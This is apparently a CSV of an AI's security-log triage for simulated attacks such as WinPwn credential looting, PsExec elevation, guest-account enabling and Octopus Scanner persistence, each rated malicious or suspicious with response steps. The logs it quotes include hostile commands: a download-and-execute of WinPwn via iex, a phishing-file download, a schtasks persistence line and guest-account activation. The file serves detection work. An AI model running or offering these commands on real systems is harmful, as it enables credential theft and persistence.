Directory Name,AI Response
WinPwn - Loot local Credentials - Safetykatz,"Upon reviewing the provided Windows event logs from the host identified as Server002, I have identified the following notable activities:

### Suspicious Behavior:

1. **SVCHOST.EXE Time Changes:**
   - Multiple `Microsoft-Windows-Kernel-General` (Event ID 1) events indicate changes in system time executed by `svchost.exe`. While this might sometimes be a routine action if the system is synchronizing time with a time server, it requires further examination to ensure there is no tampering or unusual time manipulation involved.

2. **Execution of Potentially Malicious PowerShell Command:**
   - A `Sysmon` event (Event ID 1) logs the execution of `powershell.exe` with a command line that downloads and executes a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1`. This PowerShell script execution is notable and suspicious due to:
     - The presence of `iex` (Invoke-Expression) which is often used to execute malicious scripts downloaded from the internet.
     - Use of an external source from GitHub, specifically under a non-reputed account or repository. This indicates a high risk of executing potentially harmful scripts.
   - The associated PowerShell logs also log the execution of this command confirming the download and execution attempt.

### Benign Activity:

1. **Windows Defender Activity:**
   - Events show Windows Defender being active, which is a typical and non-suspicious security product activity (Application Log, Event ID 15).

2. **Edge Update Process:**
   - The logs show Microsoft Edge Update services and executable processes being executed. These log entries are consistent with routine update activities and do not raise immediate concerns based on the available information.

### Threat Assessment and Resolution:

- The log entries pointing towards the `powershell.exe` activity are concerning and indicative of potentially malicious behavior, especially due to invoking scripts from an external, non-verified repository. This aligns with tactics where attackers use PowerShell to download and execute scripts as part of initial access or lateral movement.

**Resolution: MALICIOUS**

### Recommended Actions:

1. **Incident Containment:**
   - Immediately isolate Server002 from the network to prevent further potential lateral movement or data exfiltration.

2. **Analysis and Eradication:**
   - Conduct a thorough investigation into any files or backdoors installed by the PowerShell script execution.
   - Analyze the integrity and source of system time changes to ensure they were not maliciously triggered.

3. **System Restoration:**
   - Restore any affected files from clean backups, if available, after ensuring the threat has been entirely eradicated.

4. **Post-Incident Review:**
   - Review security protocols to detect and prevent similar breaches, including implementing robust PowerShell execution policies and regular system monitoring.

5. **Security Awareness:**
   - Educate users about the risks of executing unverified scripts and strictly enforce security policies regarding software and script execution."
Download Macro-Enabled Phishing Attachment,"### Analysis of Windows Event Logs

#### Windows PowerShell Logs
- The logs show multiple instances of a PowerShell command line being executed: 
  ```
  powershell.exe & {$url = 'https://github.com/file/file-file/raw/master/files/data.001/bin/PhishingAttachment.xlsm', [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}
  ```
- This command attempts to download an Excel file (PhishingAttachment.xlsm) from a GitHub URL and save it to a temporary directory. The file name suggests a malicious intent since ""phishing"" often refers to attempts to deceive users into revealing sensitive information.
- The use of `Invoke-WebRequest` in PowerShell to download files can be a sign of malicious activity, especially when the downloaded file is given a suspicious name hinting at phishing or other unwanted behavior.

#### Security Logs
- Security logs do not show any unusual user logins or privilege escalations. The entries logged represent normal time change operations by the system service (`svchost.exe`).

#### Application Logs
- The Application logs record a standard operation by the Microsoft-Windows-Security-SPP, which appears to be benign and related to licensing.

#### Sysmon Logs
- Sysmon shows activity related to processes such as Microsoft Edge Update and standard Windows administrative tasks. 
- The logs indicate a PowerShell process was executing on the system during the analysis period:
  ```
  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  ```
  This correlates with the activity seen in the PowerShell logs and suggests the command was run by a highly privileged user `SERVER002\admin_test`.
- There are no indications of compromised accounts or unauthorized execution of critical system processes.

#### System Logs
- The system logs document routine system processes like time adjustments with no sign of anomalies like crashes or unauthorized service starts.

### Overall Assessment
The most concerning findings come from the PowerShell logs. The PowerShell command observed is highly suspicious due to:
- Attempting to download a file named ""PhishingAttachment.xlsm"" from an external source.
- Execution by a high-privileged user (`SERVER002\admin_test`).

No legitimate business processes or user actions typically involve the download of files with suspicious naming such as ""PhishingAttachment"" from a GitHub repository using PowerShell. This action is consistent with the behavior observed in malicious attempts, where attackers use PowerShell to download and possibly execute harmful files.

### Final Resolution: MALICIOUS
Given the nature and intent implied by the PowerShell command, the activity logged is deemed malicious. As such, further action should be taken:
- Immediately contain the affected system to prevent further unauthorized access or potential data exfiltration.
- Conduct a comprehensive investigation to determine how the PowerShell script was executed and whether it was part of a larger attack.
- Review audit logs for the `admin_test` account and verify recent access credentials.
- Reset credentials if compromised and strengthen security measures like enabling PowerShell logging at a more detailed level and employing network-based threat monitoring.
- Consider contacting the source (GitHub repository owner) to request the removal of the potentially malicious file, if applicable."
Create local account with admin privileges,"Upon reviewing the Windows event logs provided, several activities stand out as significant indicators of malicious behavior. Here is a detailed analysis of the logs:

1. **Time Manipulation:**
   - In the system and security logs, events indicate a discrepancy between old and new time values being set on the system (`EventID 4616` from the Security log and `EventID 1` from the System log). The time is set back a few seconds, which can be suspicious if used to mask time-based logs or activities.

2. **Account Creation and Privilege Escalation:**
   - A new user account `art-test` was created (`EventID 4720`) and immediately added to the administrators group (`EventID 4728` and `EventID 4732`), which is uncharacteristic for normal user behavior.
   - The process creating and managing these accounts (`cmd.exe` and `net.exe` executed by `SERVER002\admin_test`, with high integrity levels) is suspicious and indicative of attempted privilege escalation.

3. **Process Execution Analysis:**
   - The execution of `cmd.exe` with a command line that adds a user and modifies group membership (`EventID 1` in Sysmon log) is a significant indicator of compromise, particularly since it performs these operations with high integrity levels.
   - `whoami.exe` and `hostname.exe` being used are not inherently suspicious but can be part of reconnaissance activities.

4. **Processes associated with Microsoft Edge Update:**
   - There are numerous entries related to `MicrosoftEdgeUpdate.exe`. While legitimate if they reflect normal operation, they align temporally with suspicious user creation activities, suggesting possible abuse of a legitimate process for obfuscation or persistence.

5. **System Integrity and Privileges:**
   - The presence of the `admin_test` user having multiple elevated privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.` in `EventID 4672`) is concerning. If this is unintended or unscheduled, it might indicate unauthorized privilege elevation.

Based on the above evidence, I would classify the activities observed in the log as **MALICIOUS**. The actions described indicate unauthorized user creation and elevation of privileges, consistent with an attempt to maintain persistence and potentially execute further exploitative activities under elevated privileges.

**Recommendations for Next Steps:**
- **Immediate Incident Response:**
  - Disable or suspend the `art-test` account and any related suspicious accounts.
  - Review and restrict privileges associated with the `admin_test` account temporarily.
- **Comprehensive System Audit:**
  - Review all administrative accounts and recent changes to group memberships.
  - Conduct full system scans for malware or other indicators of compromise.
- **Log and Alerting Enhancement:**
  - Increase monitoring and logging for similar activities, with alerts for unauthorized user creation or privilege changes.
  - Implement stricter time synchronization policies and investigate reasons for time changes on systems.

It is crucial to understand the full scope of access and potential lateral movement within the network, considering these indicators of compromise."
Activate Guest Account,"**Analysis of the Windows Event Logs:**

1. **Application log:**
   - The application log entries are primarily related to routine updates and service stoppage related to Microsoft Edge. The log shows entries for services stopping (e.g., `edgeupdate`) which is a standard process and does not indicate any malicious activity.

2. **Sysmon log:**
   - There are numerous entries for the execution of processes including `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `net.exe`. Although these executables can be used maliciously, the context of the logs does not provide direct evidence of malicious usage, with the exception of one concerning process:
     - The usage of `cmd.exe` to execute `net user guest /active:yes`, which indicates that the guest account was activated. This is a suspicious activity as enabling the guest account is uncommon in secured environments.

3. **Security log:**
   - The security log confirms the activation of the Guest account. There is a `Security-Auditing` EventID 4722, indicating the user account ""Guest"" was enabled by the user ""admin_test"". Additionally, EventID 4798 shows ""admin_test"" querying the guest user information before enabling the account.
   - The combination of enabling the Guest account and querying the account details is unusual and suggests potential privilege escalation or unauthorized access preparation.

4. **System log:**
   - The system log contains entries regarding time adjustments by the `svchost.exe` process. Adjustments in time could suggest attempts to evade detection through timestamps, but without additional context, these do not serve as high-confidence indicators of compromise.

5. **PowerShell log:**
   - The absence of any PowerShell log entries indicates no logging from PowerShell activities, which can often be used in attacks. Depending on the security configuration, this absence may need further evaluation.

**Assessment:**

- The most notable suspicious behavior is the activation of the Guest account by the user ""admin_test"". In most secure environments, activating the Guest account is considered a significant security risk. This action is often leveraged by attackers to create a less monitored and easily accessible backdoor into the system.

- The use of command `net user guest /active:yes` is comprehensive enough to categorize this activity as at least suspicious. Without further context or evidence of intended malicious behavior (e.g., data exfiltration, persistence), it's difficult to definitively classify it as malicious, but it exceeds benign activity criteria.

**Final Resolution: SUSPICIOUS**

**Guidance:**

1. Immediately investigate the actions of the user ""admin_test"" to verify if they were authorized and intended. Determine if this account has been compromised.
2. Review Group Policy and security settings to prevent unauthorized enabling of the Guest account.
3. Conduct a thorough review of the environment for other signs of compromise, such as unfamiliar services starting, network connections, and any file changes.
4. Consider implementing stricter logging and monitoring measures, especially around privileged accounts and unwanted service activation."
Enable Guest account with RDP capability and admin privileges,"Upon reviewing the provided Windows event logs, the following analysis has been made:

### Suspicious/Anomalous Behavior:
1. **Change in the Guest Account Status**:
   - A series of events are logged around 16:12:18 UTC indicating that the ""Guest"" user account on `Server002` was activated (`EventID 4722`), had its password set (`EventID 4724`), and was added to the ""Administrators"" and ""Remote Desktop Users"" group (`EventID 4732`).
   - These actions were carried out by the user `SERVER002\admin_test` using `cmd.exe` and `net.exe` commands. This is an indicator of potential privilege elevation as it modifies a typically disabled user account and grants it administrative and remote access permissions.

2. **Potential Registry Changes for Remote Desktop Access**:
   - There are registry changes to enable remote desktop connections: modifying `fDenyTSConnections` and `AllowTSConnections` registry keys.

3. **System Time Change**:
   - There are multiple events indicating a time synchronization session on `Server002`. While not inherently suspicious, time changes can sometimes be related to unauthorized actions to manipulate logs or time-sensitive operations.

4. **Command Execution and User Actions**:
   - Execution of `cmd.exe` and several commands related to network configuration and permissions changes are detected.
   - Commands executed involve common administrative tasks, but in the context of enabling a disabled account and adding it to critical groups like Administrators and Remote Desktop Users, they warrant further scrutiny.

5. **Unusual Use of `wevtutil.exe`**:
   - The `wevtutil.exe` is seen executing, which could be benign if used for querying event logs, but can also be used maliciously to alter or clear logs.

6. **Multiple Instances of `MicrosoftEdgeUpdate.exe`**:
   - Several instances of `MicrosoftEdgeUpdate.exe` and related components are present. On their own, they can be legitimate as part of automatic updates but should be verified for legitimacy.

### Assessment:
The activities observed in the logs suggest potential malicious activity:

- The use of `cmd.exe` to activate the Guest account, set its password, and add it to privileged groups, combined with registry alterations to facilitate remote access, indicate a possible unauthorized privilege escalation.
  
- Even though the system time change could have valid reasons, when combined with the other observations, it could suggest an attempt to cover tracks or perform time-sensitive unauthorized actions.

### Resolution: **MALICIOUS**
Considering the context and actions observed, it's highly likely that the logs document a security compromise or attempted system manipulation. The immediate concerns are the unauthorized elevation of privileges through the Guest account and enabling remote desktop access.

### Guidance:
- **Immediate Action**: 
  - Disable the ""Guest"" account if not needed.
  - Remove the ""Guest"" account from privileged groups.
  - Ensure the system is disconnected from any sensitive networks to prevent further access.

- **Investigate `admin_test` Activity**: 
  - Determine whether the `admin_test` account was compromised or if the actions reflected in the logs were sanctioned. 

- **Security Audit and Incident Response**:
  - Conduct a thorough investigation into how the unauthorized change was initiated.
  - Review all systems for similar unauthorized changes or suspicious behavior.
  - Change passwords for all administrative accounts and enforce multi-factor authentication if not already in place.

- **Log Review**: 
  - Continually monitor event logs for further anomalies, particularly those related to privilege or access changes.

- **Patch and Update Software**: 
  - Ensure all systems are up-to-date with security patches to mitigate exploiting known vulnerabilities.

This assessment should be reported to the relevant IT and security teams for immediate action and further forensic investigation."
Word spawned a command shell and used an IP address in the command line,"Based on the provided logs, a detailed analysis was conducted to identify any indicators of malicious activity. Here's a summary of findings from each log category:

### Application Log:
1. **Software Protection Platform Service (Security-SPP) Events**:
   - Event IDs 16384 and 16394 are routine operations related to software licensing and do not indicate malicious activity.

2. **Edge Update Event**:
   - The event indicating ""Service stopped"" does not inherently suggest anything malicious and could be part of routine operations or updates.

### Security Log:
1. **Event ID 4624**:
   - This event indicates a successful logon. Specifically, for logon type 5 (Service), which is typical for system and service logons.

2. **Event ID 4672**:
   - Special privileges for ‘SYSTEM’ account are being assigned, which is typical for administrative actions or system startup.

3. **Event ID 5379**:
   - Several failed credential access attempts for the target ""MicrosoftAccount:user=02txoixylodcstop"" and similar. While this could indicate an attempt to access specific credentials or accounts, failed attempts without further context or success do not immediately indicate a compromise.

4. **Event ID 4798**:
   - Enumerations on user accounts like ‘Administrator’, ‘Guest’, and ‘DefaultAccount’. These could be routine or part of an investigation, but frequent enumerations in a short period may need further contextual exploration.

### Windows PowerShell Log:
- **Event ID 600**:
  - The PowerShell script execution that involves downloading and executing the script from an external source `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1` and the subsequent code execution is highly suspicious. This activity is a known indicator of PowerShell-based attacks, likely downloading and executing code that could potentially be malicious (e.g., downloading malware or setting a malicious macro).

### Sysmon Log:
- **Process Execution Events**:
  - Several instances of `MicrosoftEdgeUpdate.exe` and `powershell.exe` execution are noted.
  - The execution of `PowerShell` with suspicious command-line arguments that direct download from GitHub strongly suggests potentially malicious activity.
  - `whoami.exe` and `hostname.exe` are executed, which are often used in reconnaissance post-exploitation.

### Conclusion
- **Benign**, **Suspicious**, **Malicious** Resolution:
  - Given the PowerShell logs where scripts are downloaded and executed from an untrusted external source, combined with potential suspicious behavior, these are indicative of potentially **MALICIOUS** activity.
  
### Recommended Actions:
1. **Immediate Containment**:
   - Disconnect the affected system (Server002) from the network to prevent further spread or data exfiltration.
   
2. **Investigation and Analysis**:
   - Perform a deeper forensic analysis on the affected system to determine the impact and scope of the breach.
   - Identify any artifacts left by the malicious script and ascertain if other systems may be affected.

3. **Remediation and Hardening**:
   - Clean the system by removing unauthorized scripts and restoring from backups if compromise is severe.
   - Implement stricter PowerShell execution policies and restrict script executions to signed scripts only.
   - Enhance monitoring to detect similar threats in the future by ensuring logging and alerting on PowerShell events and unusual process activities."
Octopus Scanner Malware Open Source Supply Chain,"### Analysis of the Logs:

Upon reviewing the provided log entries, the following analysis was conducted on evidence of suspicious or anomalous behavior:

1. **Scheduled Task Creation via CMD.exe and SCHTASKS.exe:**
    - A significant indicator of potentially malicious activity is identified in the Sysmon logs where a `cmd.exe` process is executing a command with `schtasks.exe` to schedule a task that runs a potentially unknown Java application every minute:
      ```plaintext
      ""CommandLine"":""\""cmd.exe\"" /c copy %%temp%%\\ExplorerSync.db %%temp%%\\..\\Microsoft\\ExplorerSync.db &amp; schtasks /create /tn ExplorerSync /tr \""javaw -jar %%temp%%\\..\\Microsoft\\ExplorerSync.db\"" /sc MINUTE /f""
      ```
    - The creation of this scheduled task named ""ExplorerSync"" and its repetition every minute to run a Java application (via `javaw -jar`) is highly suspicious. Typically, scheduled tasks like these could be used to persist malicious behavior on a system.

2. **Frequent Process Executions under SYSTEM Privileges:**
    - There are numerous instances in the logs where processes such as MicrosoftEdgeUpdate and related utilities run under `NT AUTHORITY\SYSTEM`. While updates from legitimate software could appear benign, running from temporary locations or being initiated by a user account like SERVER002\\admin_test should be scrutinized for potential privilege escalation.

3. **Process Executions from Temporary Directories:**
    - Entries show processes related to Microsoft Edge update components executing from a temporary directory `C:\\Program Files (x86)\\Microsoft\\Temp\\EU7332.tmp\\`, which is atypical placement for executable files and might indicate potential compromise as attackers often use temporary folders to hide their operations.

4. **Worrisome Command Execution with Unknown Parameters:**
    - The Windows command line indicates movement and execution of files in unusual paths. Commands include potentially malicious actions such as duplicating database files and executing unwanted software.

### Assessment:

Based on a detailed examination of the logs, especially around suspicious scheduled task creation and execution of processes from temporary directories, there are strong signs of malicious activity. The combination of seeing Edge update processes being frequently invoked with strange paths, and the creation of a scheduled task to run a potential malware every minute, strongly indicates a compromise.

### Resolution:

- **MALICIOUS**: The log analysis presents strong evidence of malicious activity including potentially unauthorized task scheduling, process execution with high privileges, and unusual paths in use. This warrants immediate containment and eradication measures.

### Guidance:

1. **Immediate Isolation**: Isolate the machine `Server002` from the network to prevent potential lateral movement of the threat within your network environment.
2. **Detailed Forensic Analysis**: Conduct a thorough forensic investigation to ascertain the scope of the compromise, specifically analyzing the `ExplorerSync.db` Java application and its effects.
3. **Credential Audits**: Verify and potentially reset credentials for the account `SERVER002\\admin_test`, as this user seems to be involved in the suspicious operations.
4. **Scheduled Task Review**: Review and remove unauthorized scheduled tasks and vulnerability traces that could have been created by the threat activity.
5. **System Patching and Hardening**: Ensure that all systems are properly patched and adhere to baseline security configurations to guard against exploitations.
   
The provided logs strongly suggest that malicious activity has been detected, necessitating urgent and comprehensive incident response actions."
Use PsExec to elevate to NT Authority\SYSTEM account,"Upon analyzing the provided logs across the Security, System, Sysmon, Windows PowerShell, and Application logs, I have identified several activities indicating potential security concerns. Here's a breakdown of the significant findings:

1. **Clearing of Event Logs**:
   - The event logs indicate multiple instances where the `event logs` were cleared (EventID 1102 from Security and 104 from System). This is a common tactic used by attackers to cover their tracks after unauthorized access.
   - Specifically, logs cleared by user `admin_test` suggest this might be a deliberate action to hide malicious activity.

2. **Use of `wevtutil.exe`**:
   - The Sysmon logs show the execution of `wevtutil.exe` commands to clear various logs (`Security`, `System`, and `Windows PowerShell`). This supports the observation that logs were cleared.

3. **Execution of PsExec**:
   - There are events indicating the installation and execution of PsExec utility (`PSEXESVC.exe`). PsExec is a legitimate tool but is often used by attackers for lateral movement or privilege escalation.
   - Command execution such as `cmd.exe /c whoami` using PsExec with elevated privileges might suggest reconnaissance or an attempt to gain further information about the environment.

4. **Privilege Escalation**:
   - There are logon events (ID 4672) indicating accounts granted special privileges (like `SeDebugPrivilege`), which could be leveraged by attackers to access sensitive system resources or processes.

5. **Suspicious Process Execution**:
   - Several suspicious processes were executed by `admin_test`, including Windows Command Processor (`cmd.exe`) with potentially harmful command-line arguments, indicative of manual commands execution which might not align with usual administrative tasks.

6. **Timeline Concerns**:
   - The sequence in which these processes and events occurred suggests an orchestrated attempt to execute commands, clear logs, and potentially pivot through systems undetected.

**Resolution: MALICIOUS**

Based on the observed log activities such as event log clearance, suspicious use of `wevtutil.exe`, deployment of PsExec, and special privilege assignments, the provided log entries exhibit characteristics of malicious behavior. Immediate action is recommended to investigate the source and extent of the breach, verify system integrity, isolate compromised systems, and remediate any unauthorized changes.

**Guidance on How to Proceed:**
- Conduct a detailed forensic analysis on the affected systems.
- Verify and secure privileged accounts with potential exposure.
- Apply relevant patches and security updates.
- Review network traffic for possible lateral movements.
- Enhance monitoring and alerting rules to detect similar activities in the future."
WinPwn - Loot local Credentials - powerhell kittie,"Upon examining the Windows event logs provided, there are several indicators within the Windows PowerShell logs that suggest potentially malicious activity. Here's the detailed analysis:

### Key Events and Indicators:

1. **PowerShell Events (EventID 600)**:
   - All PowerShell events are effectively showcasing a script being executed with the command:
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
     obfuskittiedump -consoleoutput -noninteractive}
     ```
   - This command is downloading and executing a PowerShell script from a remote repository, a known post-exploitation script, `WinPwn`, hosted on GitHub. The execution of scripts from external or unknown sources adds a significant risk factor.
   - The use of `iex` (Invoke-Expression) and `new-object net.webclient` to download and execute the script is a classic technique used by attackers to introduce malware or other malicious scripts into a system.

2. **Sysmon Events (EventID 1 and 5)**:
   - These events show process creations and images related to Windows legitimate processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe`. 
   - While these processes by themselves are not inherently malicious, their association with the timeframe of the PowerShell execution raises concerns about potential misuse or post-exploitation activity.

3. **Security Events (EventID 4672)**:
   - There’s a log indicating that the user `admin_test` has been given a series of advanced privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.). While this can occur under normal administrative operation, it is often targeted by attackers aiming for privilege escalation.

### Assessment:

Given the analysis, there is a strong indication of malicious activity. The PowerShell logs are critical as they showcase the execution of a potentially harmful script from an online repository, which in professional environments is highly suspicious and often tied to hacker toolkits designed to undermine the security of a system.

### Recommendations:

- **Resolution: MALICIOUS**
  - Immediately isolate `Server002` from the network to prevent further unauthorized access or data exfiltration.
  - Conduct a thorough forensic investigation to determine the extent of the compromise and any potential data breach.
  - Review access logs, configurations, and perform malware scans to assess if other systems might also be affected.
  - Reset credentials and review users and group policies, especially focusing on any users with elevated privileges such as `admin_test`.
  - Evaluate security awareness and training programs to prevent similar incidents.
  
These corrective actions will help mitigate current risks and strengthen the security posture against future threats."
USB Malware Spread Simulation,"After analyzing the provided Windows event logs, the following findings have been identified:

### Suspicious Activity:
1. **PowerShell Execution:**
   - Multiple PowerShell events indicate a script designed to iterate over removable drives to create a file named `dataTest1.txt`. The script writes a message in the text file that simulates malware spreading to removable drives.
   - The PowerShell command mentions: `""data Test 1 has created this file to simulate malware spread to removable drives.""` This is indicative of potentially harmful behavior often seen in actual malware trying to propagate through removable drives.
   - Execution of PowerShell scripts that interact with removable drives, particularly creating files without a clear legitimate purpose, is highly suspicious.

### Other Considerations:
2. **Process Execution Observations:**
   - Frequent use of command-line utilities like `whoami.exe`, `HOSTNAME.EXE`, and `conhost.exe` by the user `admin_test` is executed from a high integrity level. This activity might be regular administrative tasks but needs correlation with operational requirements and user activity.
   - The `wevtutil.exe` process is known for managing event logs. While used legitimately, repeated instances may indicate an attempt to clear logs to cover tracks. However, without log clearing evidence or corroborating suspicious activity, this is only a point of possible concern for further investigation.

3. **Sysmon Logs:**
   - Mostly document standard system utilities execution, which are not inherently suspicious if used in a legitimate context.
   - The most concerning entry is `powershell.exe`, consistent with previously noted PowerShell activity indicating potential malicious script use.

### Conclusion:
The combination of PowerShell events focused on removable drives, along with file creation simulating malware behavior, raises concerns about possible malicious activity.

**Resolution:**
- **MALICIOUS**: The observed behavior aligns closely with tactics often used in malware propagation, specifically through interacting with and manipulating removable drive contents using PowerShell scripts. Immediate response should include isolating any identified affected hosts, analyzing further for additional indicators of compromise (IOCs), and notifying the security operations team for more in-depth forensic analysis and threat mitigation.

### Recommended Actions:
1. **Immediate Containment:**
   - Isolate the affected system (`Server002`) from the network.
   - Inspect and potentially quarantine any connected removable drives for analysis.

2. **Investigation and Analysis:**
   - Conduct a deeper forensic investigation to uncover more details about the script origin, its execution history, and any other affected endpoints.
   - Look for additional IOCs within the environment related to this specific PowerShell activity.

3. **Remediation and Review:**
   - Remove any unauthorized scripts or files created as a result of this PowerShell execution.
   - Harden PowerShell execution policies and apply stricter logging and monitoring policies for script executions.
   - Educate users about phishing and suspicious activities to prevent inadvertent execution of such scripts."
Azure Persistence Automation Runbook Created or Modified,"Upon analyzing the provided Windows event logs, the following observations were made:

### Windows PowerShell Log Analysis:
1. **Script Execution**: The PowerShell logs show scripts executed using `powershell.exe` with specific command-line arguments. The script involves connecting to an Azure account (`Connect-AzAccount`) using credentials created from a plain text password converted into a secure string, which is notably risky and could signify vulnerability or exploitation if credentials are exposed.
   
   - **Details**: The script attempts to connect to an Azure account and create an automation runbook named 'my-test-runbook'. This activity may be benign; however, the use of empty plain-text conversion to secure-string and lacking initialization information (name, resource group name, etc.) suggest this task may not be fully benign or intended.

### Sysmon Log Analysis:
2. **Processes and Execution**: Several instances of processes such as `whoami.exe`, `wevtutil.exe`, and `conhost.exe` executed by `SERVER002\admin_test`. These tools, while legitimate, can be used for system reconnaissance, log manipulation, or process management in a potentially malicious context.

3. **Suspicious Process Execution**:
   - **Process Execution**: Logs captured processes being executed with several `EdgeUpdate` activities. These may indicate usual software updates; however, the `powershell.exe` execution tied to sensitive credential management is suspicious in this context.
   - **Use of System Utilities**: The execution of tools like `HOSTNAME.EXE` and `whoami.exe` in rapid succession could be indicative of system information gathering, usually associated with malicious behaviors during the reconnaissance phase of a cyber attack.

### Conclusion:
- The combination of usage of PowerShell scripts involving credentials with potentially malicious intent, and the assortment of system information retrieval commands executed by an administrative account raises concerns about whether these actions are scheduled tasks, part of maintenance activities, or possibly unauthorized activity.
  
### Recommendation:
Given the evidence, the current assessment leans towards a ""SUSPICIOUS"" resolution as it contains indications that warrant further investigation. Specifically, security teams should:
- Investigate the source and intent behind the PowerShell script execution.
- Assess user access controls for `SERVER002\admin_test` to ensure permissions and login activities align with expected behavior.
- Review and secure any credentials potentially exposed or manipulated using plain-text entry methods to prevent account compromise.

**Resolution: SUSPICIOUS** - Further investigation is needed to confirm the intent and legitimacy of the observed activities."
Running Chrome VPN Extensions via the Registry 2 vpn extension,"Upon analyzing the provided Windows event logs, here's the detailed breakdown:

### Security Logs:
- **Event ID 4624 (Logon Success):** The logs show several logon events with `LogonType` 5, which usually indicates a service logon. The logon is made by the `SYSTEM` account, which is a typical system operation for Windows services. Multiple entries reflect the same activity, suggesting no immediate issues.
  
- **Event ID 4672 (Special Privileges Assigned):** The `SYSTEM` user is granted multiple privileges. This is normal for the `SYSTEM` account and doesn't appear malicious in this context.

- **Event ID 5379 (Credential Retrieval):** These events indicate attempts to retrieve credentials for Microsoft account services. The return code `3221226021` indicates a ""status not supported"", which might be benign (e.g., minor misconfigurations or expected behavior in certain network environments).

- **Event ID 4798 (User Account Query):** The queries of user accounts like `Administrator`, `admin_test`, etc., originating from `C:\\Windows\\System32\\taskhostw.exe` could be routine but should be further verified with business context.

### PowerShell Logs:
- PowerShell activities showing the creation of registry entries for Chrome extensions could hint at invoking administrative capabilities but without clearer evidence of malicious intentions, it remains suspicious. The script does not demonstrate a well-known malicious intent pattern on its own.

### Application and System Logs:
- Application events are minimal, noting Windows Defender as active. Such information does not suggest compromise.

### Sysmon Logs:
- Notably, multiple system utilities such as `whoami.exe`, `hostname.exe`, and various Windows service related executables, which are normally running under `NT AUTHORITY\SYSTEM` are executed. These look standard for system operations.
  
- Execution of `powershell.exe` with parameters adding registry keys for Chrome extensions by `admin_test` is suspicious, especially if not explicitly known or expected on this server.

### Assessment:
- **Suspicious Activity**: The activities in the PowerShell logs where registry modifications are made and Chrome is manipulated could be part of a larger, possibly suspicious behavior if not recognized as legitimate administrative tasks or system maintenance.
  
- **Benign Activities**: The security events related to system services and user accounts have no malicious flags on their own.

### Conclusion:
- **Resolution**: **SUSPICIOUS**

### Recommendations:
- Conduct further investigation:
  - Verify the legitimacy of the PowerShell script and the need for Chrome extension modifications.
  - Confirm if the Windows services' account accesses, associated tasks, and tool executions are standard policy or process for the system.
  - Audit user account activity and map out any correlating incidents around the timestamps in the logs.

If any non-legitimate activities are proved or if any of these extensions appear abnormal, elevate the analysis to potentially categorize this behavior as malicious."
